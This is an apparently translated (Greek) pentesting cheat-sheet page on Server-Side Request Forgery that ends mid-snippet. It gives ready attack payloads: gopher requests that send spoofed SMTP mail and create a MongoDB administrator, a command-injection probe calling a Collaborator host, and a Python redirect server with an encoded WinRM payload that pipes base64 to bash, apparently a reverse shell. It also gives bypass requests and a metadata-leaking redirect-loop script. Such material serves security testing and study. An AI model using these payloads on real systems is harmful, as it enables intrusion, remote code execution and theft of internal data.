# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

Μια ευπάθεια **Server-side Request Forgery (SSRF)** συμβαίνει όταν ένας επιτιθέμενος χειραγωγεί μια **server-side application** ώστε να κάνει **HTTP requests** σε domain της επιλογής του. Αυτή η ευπάθεια εκθέτει τον server σε αυθαίρετα εξωτερικά requests που καθοδηγούνται από τον επιτιθέμενο.

## Capture SSRF

Το πρώτο που πρέπει να κάνετε είναι να καταγράψετε μια SSRF αλληλεπίδραση που δημιουργήσατε. Για να καταγράψετε μια HTTP ή DNS αλληλεπίδραση μπορείτε να χρησιμοποιήσετε εργαλεία όπως:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Whitelisted Domains Bypass

Συνήθως θα διαπιστώσετε ότι το SSRF λειτουργεί μόνο σε **ορισμένα επιτρεπόμενα (whitelisted) domains** ή URL. Στην παρακάτω σελίδα έχετε μια **συλλογή τεχνικών για να δοκιμάσετε να παρακάμψετε αυτήν τη whitelist**:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Παράκαμψη μέσω Open Redirect

Αν ο server είναι σωστά προστατευμένος θα μπορούσατε να **παρακάμψετε όλους τους περιορισμούς εκμεταλλευόμενοι ένα Open Redirect μέσα στη σελίδα**. Εφόσον η σελίδα επιτρέπει **SSRF στο ίδιο domain** και πιθανώς θα **ακολουθεί redirects**, μπορείτε να εκμεταλλευτείτε το **Open Redirect για να αναγκάσετε τον server να αποκτήσει πρόσβαση σε οποιονδήποτε εσωτερικό πόρο**.\
Read more here: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## Πρωτόκολλα

- **file://**
- Το URL scheme `file://` αναφέρεται, δείχνοντας απευθείας στο `/etc/passwd`: `file:///etc/passwd`
- **dict://**
- Το URL scheme DICT περιγράφεται ως χρησιμοποιούμενο για πρόσβαση σε ορισμούς ή λίστες λέξεων μέσω του πρωτοκόλλου DICT. Το παράδειγμα δείχνει ένα κατασκευασμένο URL που στοχεύει σε μια συγκεκριμένη λέξη, βάση δεδομένων και αριθμό εγγραφής, καθώς και μια περίπτωση ενός PHP script που μπορεί να κακοποιηθεί για να συνδεθεί σε DICT server χρησιμοποιώντας credentials που παρέχονται από τον attacker: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Αναγνωρίζεται ως πρωτόκολλο για ασφαλή μεταφορά αρχείων πάνω από secure shell, παρέχεται παράδειγμα που δείχνει πώς ένα PHP script θα μπορούσε να εκμεταλλευτεί για να συνδεθεί σε κακόβουλο SFTP server: `url=sftp://generic.com:11111/`
- **TFTP://**
- Το Trivial File Transfer Protocol, που λειτουργεί πάνω από UDP, αναφέρεται με ένα παράδειγμα PHP script σχεδιασμένο να στείλει ένα request σε TFTP server. Ένα TFTP request γίνεται στο 'generic.com' στην πόρτα '12346' για το αρχείο 'TESTUDPPACKET': `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- Αυτή η ενότητα καλύπτει το Lightweight Directory Access Protocol, τονίζοντας τη χρήση του για τη διαχείριση και πρόσβαση σε κατανεμημένες υπηρεσίες directory πληροφοριών πάνω από IP δίκτυα. Αλληλεπιδράστε με έναν LDAP server στο localhost: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- Περιγράφεται μια μέθοδος για εκμετάλλευση SSRF ευπαθειών ώστε να αλληλεπιδράσετε με SMTP services στο localhost, συμπεριλαμβανομένων βημάτων για να αποκαλύψετε εσωτερικά domain ονόματα και περαιτέρω ερευνητικές ενέργειες βάσει αυτών των πληροφοριών.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- Αν το SSRF εκτελείται μέσω του **curl**, το curl διαθέτει μια λειτουργία που ονομάζεται [**URL globbing**](https://everything.curl.dev/cmdline/globbing) η οποία μπορεί να είναι χρήσιμη για την παράκαμψη WAFs. Για παράδειγμα, σε αυτό το [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) θα βρείτε ένα παράδειγμα για **path traversal via `file` protocol**:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Το πρωτόκολλο Gopher συζητάται ως προς τη δυνατότητα να καθορίζεις την **IP, port and bytes** για επικοινωνία με έναν server, μαζί με εργαλεία όπως [Gopherus](https://github.com/tarunkant/Gopherus) και [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) για τη δημιουργία payloads. Εξηγούνται δύο διαφορετικές χρήσεις:

### Gopher://

Χρησιμοποιώντας αυτό το πρωτόκολλο μπορείς να καθορίσεις τα **IP, port and bytes** που θέλεις ο server να **send**. Έτσι, μπορείς ουσιαστικά να εκμεταλλευτείς ένα SSRF για να **communicate with any TCP server** (αλλά πρέπει πρώτα να ξέρεις πώς να μιλήσεις στην υπηρεσία).\
Ευτυχώς, μπορείς να χρησιμοποιήσεις το [Gopherus](https://github.com/tarunkant/Gopherus) για να δημιουργήσεις payloads για διάφορες υπηρεσίες. Επιπλέον, το [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) μπορεί να χρησιμοποιηθεί για να δημιουργήσει _gopher_ payloads για υπηρεσίες _Java RMI_.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — Back connect to 1337**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- Δημιουργία χρήστη με username=admin, password=admin123 και permission=administrator
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF μέσω του Referrer header & άλλα

Το λογισμικό analytics σε servers συχνά καταγράφει το Referrer header για να παρακολουθεί εισερχόμενους συνδέσμους, μια πρακτική που άθελά της εκθέτει τις εφαρμογές σε ευπάθειες Server-Side Request Forgery (SSRF). Αυτό συμβαίνει επειδή τέτοιο λογισμικό μπορεί να επισκεφθεί εξωτερικά URLs που αναφέρονται στο Referrer header για να αναλύσει το περιεχόμενο του ιστότοπου παραπομπής. Για να αποκαλυφθούν αυτές οι ευπάθειες, συνιστάται το Burp Suite plugin "**Collaborator Everywhere**", αξιοποιώντας τον τρόπο που τα εργαλεία analytics επεξεργάζονται το Referer header για να εντοπίσουν πιθανές επιφάνειες επίθεσης SSRF.

## SSRF μέσω SNI data from certificate

Μια κακή διαμόρφωση που θα μπορούσε να επιτρέψει τη σύνδεση σε οποιοδήποτε backend μέσω μιας απλής ρύθμισης απεικονίζεται με ένα παράδειγμα Nginx configuration:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
Σε αυτή τη διαμόρφωση, η τιμή από το πεδίο Server Name Indication (SNI) χρησιμοποιείται άμεσα ως η διεύθυνση του backend. Αυτή η ρύθμιση εκθέτει μια ευπάθεια σε Server-Side Request Forgery (SSRF), η οποία μπορεί να εκμεταλλευτεί απλά με τον καθορισμό της επιθυμητής διεύθυνσης IP ή ονόματος τομέα στο πεδίο SNI. Παρακάτω δίνεται ένα παράδειγμα εκμετάλλευσης για να αναγκάσετε μια σύνδεση σε έναν αυθαίρετο backend, όπως `internal.host.com`, χρησιμοποιώντας την εντολή `openssl`:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF with Command Injection

Αξίζει ίσως να δοκιμάσετε ένα payload όπως: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## Δημιουργία PDF

Εάν η σελίδα δημιουργεί αυτόματα ένα PDF με κάποιες πληροφορίες που έχετε παρέχει, μπορείτε να **εισάγετε κάποιο JS που θα εκτελεστεί από τον δημιουργό του PDF** ο ίδιος (τον διακομιστή) κατά τη δημιουργία του PDF και θα μπορέσετε να εκμεταλλευτείτε ένα SSRF. [**Find more information here**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## From SSRF to DoS

Δημιουργήστε πολλές συνεδρίες και προσπαθήστε να κατεβάσετε μεγάλα αρχεία εκμεταλλευόμενοι το SSRF από τις συνεδρίες.

## SSRF PHP Functions

Ελέγξτε την παρακάτω σελίδα για ευπαθείς PHP και ακόμη και Wordpress συναρτήσεις:


{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF Redirect to Gopher

Για ορισμένες εκμεταλλεύσεις μπορεί να χρειαστεί να **στείλετε μια απάντηση ανακατεύθυνσης** (πιθανώς για να χρησιμοποιήσετε διαφορετικό πρωτόκολλο όπως gopher). Εδώ έχετε διάφορους κώδικες python για να απαντήσετε με ανακατεύθυνση:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## Λανθασμένα διαμορφωμένοι proxies για SSRF

Κόλπα [**from this post**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Flask proxy ευάλωτος κώδικας</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Το Flask επιτρέπει τη χρήση του **`@`** ως αρχικού χαρακτήρα, γεγονός που επιτρέπει να μετατραπεί το **αρχικό host name σε username** και να εγχυθεί ένα νέο. Αίτημα επίθεσης:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

Ευπαθές code:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

Διαπιστώθηκε ότι είναι δυνατό να **start the path** ενός αιτήματος με τον χαρακτήρα **`;`**, κάτι που επιτρέπει στη συνέχεια τη χρήση του **`@`** και την εισαγωγή ενός νέου host για πρόσβαση. Attack request:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### Ενσωματωμένος web server του PHP <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>Ευάλωτος PHP κώδικας</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP επιτρέπει τη χρήση του χαρακτήρα **`*` πριν από ένα slash στο path** της URL, ωστόσο έχει και άλλους περιορισμούς, όπως ότι μπορεί να χρησιμοποιηθεί μόνο για το root pathname `/` και ότι οι τελείες `.` δεν επιτρέπονται πριν από το πρώτο slash, οπότε χρειάζεται να χρησιμοποιηθεί, για παράδειγμα, μια διεύθυνση IP κωδικοποιημένη σε hex χωρίς τελείες:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

Αν αντιμετωπίζετε **προβλήματα** να **exfiltrate content from a local IP** λόγω **CORS/SOP**, το **DNS Rebidding** μπορεί να χρησιμοποιηθεί για να παρακάμψει αυτόν τον περιορισμό:


{{#ref}}
../cors-bypass.md
{{#endref}}

### Αυτοματοποιημένο DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) είναι ένα εργαλείο για την εκτέλεση επιθέσεων [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding). Περιλαμβάνει τα απαραίτητα components για να rebind την IP διεύθυνση του DNS ονόματος του attacker server στην IP διεύθυνση της target machine και να σερβίρει attack payloads για την εκμετάλλευση ευάλωτου λογισμικού στη target machine.

Δείτε επίσης τον δημόσια διαθέσιμο server στο [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Requirements:

- **SSRF**
- **Outbound TLS sessions**
- **Stuff on local ports**

Attack:

1. Ζητήστε από τον user/bot να κάνει **access** σε ένα **domain** που ελέγχεται από τον **attacker**
2. Το **TTL** του **DNS** είναι **0** sec (οπότε το victim θα ελέγξει ξανά την IP του domain σύντομα)
3. Μια **TLS connection** δημιουργείται μεταξύ του victim και του domain του attacker. Ο attacker εισάγει το **payload inside** το **Session ID ή Session Ticket**.
4. Το **domain** θα ξεκινήσει έναν **infinite loop** από **redirects** εναντίον του **ίδιου**. Ο στόχος είναι να κάνει τον user/bot να προσπελάσει το domain μέχρι να εκτελέσει **ξανά** ένα **DNS request** για το domain.
5. Στο DNS request τώρα επιστρέφεται μια **private IP** διεύθυνση (π.χ. 127.0.0.1)
6. Ο user/bot θα προσπαθήσει να **reestablish the TLS connection** και για να το κάνει αυτό θα **στείλει** το **Session ID/Session Ticket ID** (όπου περιεχόταν το **payload** του attacker). Συγχαρητήρια — καταφέρατε να κάνετε τον **user/bot** να επιτεθεί στον εαυτό του.

Σημειώστε ότι κατά τη διάρκεια αυτής της επίθεσης, αν θέλετε να επιτεθείτε σε localhost:11211 (_memcache_) πρέπει να κάνετε το victim να δημιουργήσει την αρχική σύνδεση με www.attacker.com:11211 (η **θύρα πρέπει πάντα να είναι η ίδια**).\
Για την εκτέλεση αυτής της επίθεσης μπορείτε να χρησιμοποιήσετε το εργαλείο: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
Για **περισσότερες πληροφορίες** δείτε το talk όπου αυτή η επίθεση εξηγείται: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

Η διαφορά μεταξύ ενός blind SSRF και ενός μη-blind είναι ότι στο blind δεν μπορείτε να δείτε την απόκριση του SSRF request. Επομένως είναι πιο δύσκολο να εκμεταλλευτείτε, καθώς θα μπορείτε να εκμεταλλευτείτε μόνο γνωστές ευπάθειες.

### Time based SSRF

**Έλεγχος του χρόνου** των αποκρίσεων από τον server μπορεί να κάνει **δυνατό να γνωρίζουμε αν ένας resource υπάρχει ή όχι** (ίσως παίρνει περισσότερο χρόνο η πρόσβαση σε υπάρχοντα resource από ό,τι σε ένα που δεν υπάρχει)

### From blid to full abusing status codes

Σύμφωνα με αυτήν την [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/), κάποια blind SSRF μπορεί να συμβούν επειδή ακόμα και αν το στοχευμένο URL απαντά με 200 status code (όπως τα AWS metadata), αυτά τα data δεν είναι σωστά μορφοποιημένα και επομένως η εφαρμογή μπορεί να αρνηθεί να τα εμφανίσει.

Ωστόσο, διαπιστώθηκε ότι στέλνοντας κάποιες redirect απαντήσεις με κωδικούς από 305 έως 309 στο SSRF, μπορεί να γίνει η εφαρμογή να **ακολουθήσει αυτά τα redirects ενώ εισέρχεται σε κατάσταση σφάλματος** που δεν θα ελέγχει πλέον το format των δεδομένων και μπορεί απλώς να τα εκτυπώσει.

The python server used to exploit this is th following:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**Βήματα:**
- Το πρώτο 302 κάνει την εφαρμογή να αρχίσει να ακολουθεί.
- Στη συνέχεια λαμβάνει 305 → 306 → 307 → 308 → 309 → 310.
- Μετά τον 5ο περίεργο κωδικό το PoC τελικά επιστρέφει 302 → 169.254.169.254 → 200 OK.

**Τι συμβαίνει μέσα στον στόχο:**
- Ο ίδιος ο libcurl ακολουθεί τα 305–310· απλώς εξομαλύνει άγνωστους κωδικούς σε “follow.”
- Μετά από N περίεργες ανακατευθύνσεις (≥ 5 εδώ) ο wrapper της εφαρμογής αποφασίζει “κάτι δεν πάει καλά” και μεταβαίνει σε λειτουργία σφάλματος προορισμένη για αποσφαλμάτωση.
- Σε αυτή τη λειτουργία απορρίπτει όλη την αλυσίδα ανακατευθύνσεων μαζί με το τελικό body πίσω στον εξωτερικό καλούντα.
- Αποτέλεσμα: ο επιτιθέμενος βλέπει κάθε header + το metadata JSON, αποστολή ολοκληρώθηκε.

Σημειώστε ότι αυτό είναι ενδιαφέρον για να leak status codes που δεν μπορούσατε να leak πριν (όπως ένα 200). Ωστόσο, αν κατά κάποιο τρόπο μπορούσατε επίσης να επιλέξετε τον status code της απάντησης (φανταστείτε ότι μπορείτε να αποφασίσετε ότι τα AWS metadata απαντούν με status code 500), **ενδέχεται κάποιοι status codes να leak άμεσα το περιεχόμενο της απάντησης.**

### HTML-to-PDF renderers as blind SSRF gadgets

Βιβλιοθήκες όπως **TCPDF** (και wrappers όπως **spipu/html2pdf**) θα κατεβάζουν αυτόματα οποιεσδήποτε URLs υπάρχουν σε HTML που ελέγχεται από τον επιτιθέμενο κατά την απόδοση σε PDF. Κάθε `<img>` ή `<link rel="stylesheet">` attribute επιλύεται server-side μέσω cURL, `getimagesize()`, ή `file_get_contents()`, οπότε μπορείτε να οδηγήσετε τον PDF worker να ελέγξει εσωτερικούς hosts παρότι καμία HTTP απάντηση δεν σας αντικατοπτρίζεται.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
